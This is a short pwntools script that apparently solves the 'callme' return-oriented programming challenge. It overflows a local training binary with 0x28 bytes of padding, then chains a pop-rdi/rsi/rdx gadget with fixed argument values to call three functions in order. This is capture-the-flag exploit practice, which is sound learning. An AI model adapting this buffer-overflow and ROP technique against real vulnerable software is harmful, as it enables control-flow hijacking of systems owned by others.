#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
context.update(arch="amd64", os="linux")

e = ELF("./callme")
r = ROP(e)

pppr = 0x000000000040093c # pop rdi ; pop rsi ; pop rdx ; ret

r.raw(asm("nop") * 0x28)

"""
    mov     [rbp+var_18], rdi
    mov     [rbp+var_20], rsi
    mov     [rbp+var_28], rdx
"""
r.raw(p64(pppr)) 
r.raw(0xDEADBEEFDEADBEEF)
r.raw(0xCAFEBABECAFEBABE)
r.raw(0xD00DF00DD00DF00D)
r.callme_one()

r.raw(p64(pppr)) 
r.raw(0xDEADBEEFDEADBEEF)
r.raw(0xCAFEBABECAFEBABE)
r.raw(0xD00DF00DD00DF00D)
r.callme_two()

r.raw(p64(pppr)) 
r.raw(0xDEADBEEFDEADBEEF)
r.raw(0xCAFEBABECAFEBABE)
r.raw(0xD00DF00DD00DF00D)
r.callme_three()

proc = process([e.path, e.path])
proc.send(r.chain())
proc.recvall()

